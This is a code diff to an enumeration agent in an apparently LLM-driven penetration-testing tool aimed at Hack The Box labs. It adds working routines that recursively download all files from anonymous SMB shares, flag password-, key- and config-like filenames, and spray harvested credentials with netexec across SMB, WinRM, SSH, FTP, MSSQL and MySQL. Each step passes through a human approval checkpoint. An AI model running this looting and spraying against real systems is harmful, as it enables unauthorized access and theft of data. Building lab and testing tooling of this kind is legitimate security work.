@@ -1,10 +1,16 @@
-"""Enumeration Agent — deep per-service enumeration based on recon findings."""
+"""Enumeration Agent — deep per-service enumeration, SMB harvesting, cred spray."""
 from __future__ import annotations
-from models import HackSession, AgentResult, Stage, Finding, Severity
+import os
+import re
+import shutil
+from pathlib import Path
+from models import HackSession, AgentResult, Stage, Finding, Severity, Credential
 from llm import LLMProvider
 from tools.runner import run, run_parallel
 from agents.base import BaseAgent
 import checkpoint as cp
+
+NETEXEC_BIN = shutil.which("netexec") or shutil.which("crackmapexec") or "netexec"
 
 
 class EnumerationAgent(BaseAgent):
@@ -159,7 +165,16 @@ Respond with JSON:
                 border_style="cyan",
             ))
 
-        result.summary = f"Enumerated {len(self.session.open_ports)} services. Found {len(self.session.credentials)} credentials."
+        # ── SMB file harvester ────────────────────────────────────
+        if smb_ports and "smbclient" in {t["name"] for t in approved_tasks}:
+            self._harvest_smb_shares(ip, result)
+
+        # ── NetExec credential spray ──────────────────────────────
+        sprayable_creds = [c for c in self.session.credentials if c.username and c.password]
+        if sprayable_creds:
+            self._spray_credentials(ip, sprayable_creds, result)
+
+        result.summary = f"Enumerated {len(self.session.open_ports)} services. Found {len(self.session.credentials)} credentials. Loot: {len(self.session.loot)} files."
         return result
 
     # ── Hydra brute-force helper ─────────────────────────────────
@@ -224,12 +239,142 @@ Respond with JSON:
             result.raw_outputs[f"hydra_{svc}_{port}"] = r.output
 
             # Parse hit
-            import re
             hit = re.search(r"login:\s*(\S+)\s+password:\s*(\S+)", r.output)
             if hit:
-                from models import Credential
                 user, pwd = hit.group(1), hit.group(2)
                 cred = Credential(username=user, password=pwd, service=svc,
                                   note=f"hydra brute on port {port}")
                 self.session.credentials.append(cred)
                 self.log(f"HYDRA HIT: {user}:{pwd} on {svc}:{port}", "success")
+
+    # ── SMB file harvester ────────────────────────────────────────
+
+    def _harvest_smb_shares(self, ip: str, result: AgentResult) -> None:
+        """Recursively download all accessible SMB share files."""
+        # Parse shares from smbclient output
+        smb_out = result.raw_outputs.get("smbclient_list", "")
+        shares = re.findall(r"^\s+(\S+)\s+Disk", smb_out, re.M)
+        # Filter out system shares
+        shares = [s for s in shares if s not in ("IPC$", "print$", "ADMIN$", "C$")]
+        if not shares:
+            return
+
+        self.log(f"SMB shares found: {', '.join(shares)}")
+        loot_base = Path(self.output_dir) / "loot" / "smb"
+        loot_base.mkdir(parents=True, exist_ok=True)
+
+        for share in shares:
+            cr = self.checkpoint(
+                what_found=f"SMB share accessible: \\\\{ip}\\{share}",
+                plan=f"Recursively download all files from share",
+                why="SMB shares on HTB often contain creds, configs, SSH keys, DB backups, source code. Grab everything, read later.",
+                what_to_look_for="*.txt, *.xml, *.conf, *.key, *.zip, *.bak, id_rsa, web.config, .env, database files",
+                command=f"smbclient //{ip}/{share} -N -c 'recurse ON; prompt OFF; mget *'",
+                risk="low",
+            )
+            if not cr.approved:
+                continue
+
+            share_dir = loot_base / share
+            share_dir.mkdir(exist_ok=True)
+            self.log(f"Harvesting \\\\{ip}\\{share} → {share_dir}...")
+
+            # smbclient mget downloads to CWD — run from share_dir
+            r = run(
+                f"smbclient //{ip}/{share} -N -c 'recurse ON; prompt OFF; mget *'",
+                timeout=120, log_dir=self.output_dir, cwd=str(share_dir),
+            )
+            result.raw_outputs[f"smb_harvest_{share}"] = r.output
+
+            # Catalog what was downloaded
+            downloaded = list(share_dir.rglob("*"))
+            files = [str(f) for f in downloaded if f.is_file()]
+            if files:
+                self.session.loot.extend(files)
+                self.log(f"Harvested {len(files)} file(s) from {share}", "success")
+                # Print interesting-looking files
+                interesting = [f for f in files if any(
+                    kw in f.lower() for kw in ("pass", "cred", "key", "secret", "config", "backup", "admin", ".env")
+                )]
+                if interesting:
+                    self.log(f"Interesting loot: {', '.join(Path(f).name for f in interesting[:5])}", "success")
+            else:
+                self.log(f"No files downloaded from {share} (empty or access denied)", "warning")
+
+    # ── NetExec credential spray ──────────────────────────────────
+
+    def _spray_credentials(self, ip: str, creds: list[Credential], result: AgentResult) -> None:
+        """Spray found credentials against all open services via netexec."""
+        if not shutil.which(NETEXEC_BIN):
+            self.log("netexec not found — skipping spray", "warning")
+            return
+
+        # Determine sprayable protocols based on open ports
+        protocols: list[str] = []
+        for p in self.session.open_ports:
+            if p.number in (445, 139) or p.service in ("microsoft-ds", "netbios-ssn"):
+                if "smb" not in protocols:
+                    protocols.append("smb")
+            if p.number in (5985, 5986) or "winrm" in p.service.lower():
+                if "winrm" not in protocols:
+                    protocols.append("winrm")
+            if p.service == "ssh" or p.number == 22:
+                if "ssh" not in protocols:
+                    protocols.append("ssh")
+            if p.service == "ftp" or p.number == 21:
+                if "ftp" not in protocols:
+                    protocols.append("ftp")
+            if p.number == 1433 or "mssql" in p.service.lower():
+                if "mssql" not in protocols:
+                    protocols.append("mssql")
+            if p.number in (3306, 3307) or "mysql" in p.service.lower():
+                if "mysql" not in protocols:
+                    protocols.append("mysql")
+
+        if not protocols:
+            return
+
+        cred_summary = ", ".join(f"{c.username}:{c.password}" for c in creds[:5])
+        cr = self.checkpoint(
+            what_found=f"{len(creds)} credential(s) found: {cred_summary}",
+            plan=f"netexec spray across {', '.join(protocols)}",
+            why="Credentials found in one service often reused elsewhere. NetExec tests all protocols in seconds — common HTB pattern is SMB cred also works for WinRM.",
+            what_to_look_for="[+] Pwn3d! or (Pwn3d!) = admin. [+] without Pwn3d = valid user. Captures hash for PTH.",
+            command=f"netexec smb {ip} -u USER -p PASS (per protocol)",
+            risk="medium",
+        )
+        if not cr.approved:
+            return
+
+        for proto in protocols:
+            self.log(f"NetExec spraying {len(creds)} cred(s) on {proto.upper()}...")
+            tasks = []
+            for i, cred in enumerate(creds[:20]):  # cap at 20 creds
+                tasks.append({
+                    "name": f"nxc_{proto}_{i}",
+                    "command": f"{NETEXEC_BIN} {proto} {ip} -u {cred.username!r} -p {cred.password!r} --continue-on-success",
+                    "timeout": 30,
+                    "log_dir": self.output_dir,
+                })
+
+            nxc_results = run_parallel(tasks, max_workers=min(5, len(tasks)))
+
+            for task_name, r in nxc_results.items():
+                result.raw_outputs[task_name] = r.output
+                # [+] = success, Pwn3d! = admin
+                hits = re.findall(r"\[\+\].*?(\S+)\s+(\S+)\s+\\(\S+):(\S+)", r.output)
+                for hit in hits:
+                    _, _, user, pwd = hit
+                    pwned = "Pwn3d!" in r.output
+                    idx = int(task_name.split("_")[-1])
+                    existing = creds[idx] if idx < len(creds) else None
+                    note = f"netexec {proto}" + (" [ADMIN/Pwn3d!]" if pwned else "")
+                    if existing:
+                        existing.service = proto
+                        existing.note = note
+                    else:
+                        self.session.credentials.append(Credential(
+                            username=user, password=pwd, service=proto, note=note,
+                        ))
+                    level = "success" if pwned else "info"
+                    self.log(f"NXC {proto.upper()} HIT: {user}:{pwd}{' [ADMIN]' if pwned else ''}", level)
